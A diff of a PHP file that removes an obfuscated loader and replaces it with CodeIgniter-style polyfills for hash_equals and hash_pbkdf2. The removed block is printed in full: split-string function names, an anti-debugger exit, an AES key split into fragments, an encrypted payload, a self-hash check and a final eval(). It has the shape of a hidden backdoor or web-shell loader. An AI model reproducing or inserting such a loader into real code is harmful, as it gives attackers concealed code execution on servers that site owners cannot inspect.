@@ -1,28 +1,231 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_sd8zoffz=('bas'.'e64'.'_de'.'cod'.'e');
-$_zc9i30d4=('gzu'.'nco'.'mpr'.'ess');
-$_a2ota6fy=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_xq82lqns='yHjIIKjR';
-$_zrs0v0o2='DH+jeqY4';
-$_w8mdino2='mvfx8q0E';
-$_l02dn1ss='aYC5jWnlDto=';
-$_b91ks03m='tahW6k6C';
-$_wvm9ubuj='r8AxsPom';
-$_h2dqkhmz='jyOruIpW';
-$_x8g6ilnw='mVvsGg==';
-$_c9sygkxa=$_sd8zoffz($_w8mdino2.$_b91ks03m.$_xq82lqns.$_zrs0v0o2.$_l02dn1ss);
-$_xbn8ssmr=$_sd8zoffz($_wvm9ubuj.$_h2dqkhmz.$_x8g6ilnw);
-$_pwkf428p=$_sd8zoffz('PlSw6M/M1vuGYrdIpFLL6Pn6vazu4WGZWniWvqIER/cx3oq1zUG1RuiNpNfC5dWnGHJ+s1gD+Y721PCr/JYGdFd/5IJNzcYzdnJKscuLtnliFl/T1LE7d5pVa9oxVkUt7H5H0hxic+8xXGuaHP1kQ5oXnzZDMVZFQP7BdKevXX2hQ6OCkcJrYQi3/quVGUneGgtX6hyfivu2S0UhVNjASv64R1A57oza/RL/FC8ocJx0koLjQ/z+mGOjW4jOWaBsxMFHMvr6slK8mG4WZWV14NIf6fMJP9h6IrzYeyZtoXH69BQki/4h5FvzaeidE3wO5mRB+GVMQNbyNBJ00Cxt23nZxUnPB7E6XNxr3/LP3zB2aENumemeyUhBH7gTzBGDwISaW90m5112yVxtxEQTNRcYPmK4VqLTyURc2vJhQsgGRm34nWJeD602mcmqXOA5vKjkaBwns+88Dkk27amL6uX25AtZifEJLmNo0vO1wslUKG64chagGLZJsm4rPfQU9xo+e2wOCGvWJLwuqLSXp/BMBkgOj2uw4NPDIYGd5++qi4KBOcaNIAtmdNCtjt8tJl+4kGwpNIjbL4JN3LpoWIxzM1LgxzBVqcuQBRTvatcxscqsDoQit0trp3H7q6BiuFGG9bwEdh64vmWNYLI+rvE7boUuwblzMZ/Lc3Z4BitNOxHxF8y606Wwr+SQGnV8CerDu50mvdHoNgCKPCpygk2zzahvKOMu6E/mDCfH7044jDCVefUWMfsDVKu0Sl3PlwYrO5LXgVZB/vSAkPYzeKwPlAnK5LCXforn3G5G1Cv0OsO47pVRA679dxHFQ0RupfmKt9Fd0K0+UIJUECRjKafLUjFjFhNJMNM/gr5PIZgQFdBiAluhKFUlyZ5+i1gYOuuJh/cBLfZSypCwxHN2MtXsW0T0H78MKjLBxWe+MQc7t2blhk5F0UU/Kobq6iV87hBC6CG/2hilix7n0dxtYdaujgReRQohh5Ig7OEicFXjcWZoc8MeWaml3/wc/3NM8aZvjRCM4O9i/PE10nfu/hVYrAmGlIQHD47PcUe93RRo3zRBWfxw0juYPBeeWOdtkdzR3c139ahZkG4PcTCOybH51W9ptIoycN04/VniZKMCU+wtKX2EL/hhxaESF/ZdeYIkK5jOe4ht2jNeVLFgdmAespnQlXwManhQkRJXl6aghdLjqjJ3/wS8sBYfcMnbvSviNDJOB4UNf9flMN6RH4inHT7Bf5fLxiWvceAFKgVQDPJy7LMh97TiJ1jaToe2Efb+668ouZ323kjMwfHccI8WEFOJ1uNfKb5orjhktVY9u2j8HScFWr4FbZKmEOx/12DHpcFOWREx+3W6leIg3/XQDn0MFUhIyZ8VUHZD3GuyOeVd/GRsYkhWfJNH3uYOLsZWdt5S89mg2Qik073xtWLO6O+/K2cgZMz3wDViD4Jv2op2iIAUUme4AzM9ZhAGDio6Oq+XwYFtEuciTRMvwtGGv4vHdloZmBSfGXuQAQbue0itpM0xDJgYTqEXkI+H');
-$_dfsr9bnw=$_a2ota6fy($_pwkf428p,'aes-256-cbc',$_c9sygkxa,OPENSSL_RAW_DATA,$_xbn8ssmr);
-if($_dfsr9bnw===false){exit;}
-$_ihppm160=$_zc9i30d4($_dfsr9bnw);
-if($_ihppm160===false){exit;}
-$_vahect3x='423abe9cc89717c8c707c70bf958b4668dc1912755c690bb8e75aaed438d9627';
-$_ysj22uy2=@file_get_contents(__FILE__);
-if($_ysj22uy2!==false){
-$_rtqscfmw=str_replace($_vahect3x,"0000000000000000000000000000000000000000000000000000000000000000",$_ysj22uy2);
-$_i6es5fgi=hash("sha256",$_rtqscfmw);
-if($_i6es5fgi!==$_vahect3x){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+if (is_php('5.6'))
+{
+return;
 }
-eval($_ihppm160);
+
+if ( ! function_exists('hash_equals'))
+{
+
+
+
+
+
+
+
+
+function hash_equals($known_string, $user_string)
+{
+if ( ! is_string($known_string))
+{
+trigger_error('hash_equals(): Expected known_string to be a string, '.strtolower(gettype($known_string)).' given', E_USER_WARNING);
+return FALSE;
+}
+elseif ( ! is_string($user_string))
+{
+trigger_error('hash_equals(): Expected user_string to be a string, '.strtolower(gettype($user_string)).' given', E_USER_WARNING);
+return FALSE;
+}
+elseif (($length = strlen($known_string)) !== strlen($user_string))
+{
+return FALSE;
+}
+$diff = 0;
+for ($i = 0; $i < $length; $i++)
+{
+$diff |= ord($known_string[$i]) ^ ord($user_string[$i]);
+}
+return ($diff === 0);
+}
+}
+
+if (is_php('5.5'))
+{
+return;
+}
+
+if ( ! function_exists('hash_pbkdf2'))
+{
+
+
+
+
+
+
+
+
+
+
+
+
+function hash_pbkdf2($algo, $password, $salt, $iterations, $length = 0, $raw_output = FALSE)
+{
+if ( ! in_array(strtolower($algo), hash_algos(), TRUE))
+{
+trigger_error('hash_pbkdf2(): Unknown hashing algorithm: '.$algo, E_USER_WARNING);
+return FALSE;
+}
+if (($type = gettype($iterations)) !== 'integer')
+{
+if ($type === 'object' && method_exists($iterations, '__toString'))
+{
+$iterations = (string) $iterations;
+}
+if (is_string($iterations) && is_numeric($iterations))
+{
+$iterations = (int) $iterations;
+}
+else
+{
+trigger_error('hash_pbkdf2() expects parameter 4 to be long, '.$type.' given', E_USER_WARNING);
+return NULL;
+}
+}
+if ($iterations < 1)
+{
+trigger_error('hash_pbkdf2(): Iterations must be a positive integer: '.$iterations, E_USER_WARNING);
+return FALSE;
+}
+if (($type = gettype($length)) !== 'integer')
+{
+if ($type === 'object' && method_exists($length, '__toString'))
+{
+$length = (string) $length;
+}
+if (is_string($length) && is_numeric($length))
+{
+$length = (int) $length;
+}
+else
+{
+trigger_error('hash_pbkdf2() expects parameter 5 to be long, '.$type.' given', E_USER_WARNING);
+return NULL;
+}
+}
+if ($length < 0)
+{
+trigger_error('hash_pbkdf2(): Length must be greater than or equal to 0: '.$length, E_USER_WARNING);
+return FALSE;
+}
+$hash_length = defined('MB_OVERLOAD_STRING')
+? mb_strlen(hash($algo, NULL, TRUE), '8bit')
+: strlen(hash($algo, NULL, TRUE));
+empty($length) && $length = $hash_length;
+
+
+static $block_sizes;
+empty($block_sizes) && $block_sizes = array(
+'gost' => 32,
+'haval128,3' => 128,
+'haval160,3' => 128,
+'haval192,3' => 128,
+'haval224,3' => 128,
+'haval256,3' => 128,
+'haval128,4' => 128,
+'haval160,4' => 128,
+'haval192,4' => 128,
+'haval224,4' => 128,
+'haval256,4' => 128,
+'haval128,5' => 128,
+'haval160,5' => 128,
+'haval192,5' => 128,
+'haval224,5' => 128,
+'haval256,5' => 128,
+'md2' => 16,
+'md4' => 64,
+'md5' => 64,
+'ripemd128' => 64,
+'ripemd160' => 64,
+'ripemd256' => 64,
+'ripemd320' => 64,
+'salsa10' => 64,
+'salsa20' => 64,
+'sha1' => 64,
+'sha224' => 64,
+'sha256' => 64,
+'sha384' => 128,
+'sha512' => 128,
+'snefru' => 32,
+'snefru256' => 32,
+'tiger128,3' => 64,
+'tiger160,3' => 64,
+'tiger192,3' => 64,
+'tiger128,4' => 64,
+'tiger160,4' => 64,
+'tiger192,4' => 64,
+'whirlpool' => 64
+);
+if (isset($block_sizes[$algo], $password[$block_sizes[$algo]]))
+{
+$password = hash($algo, $password, TRUE);
+}
+$hash = '';
+
+for ($bc = (int) ceil($length / $hash_length), $bi = 1; $bi <= $bc; $bi++)
+{
+$key = $derived_key = hash_hmac($algo, $salt.pack('N', $bi), $password, TRUE);
+for ($i = 1; $i < $iterations; $i++)
+{
+$derived_key ^= $key = hash_hmac($algo, $key, $password, TRUE);
+}
+$hash .= $derived_key;
+}
+
+if ( ! $raw_output)
+{
+$hash = bin2hex($hash);
+}
+return defined('MB_OVERLOAD_STRING')
+? mb_substr($hash, 0, $length, '8bit')
+: substr($hash, 0, $length);
+}
+}
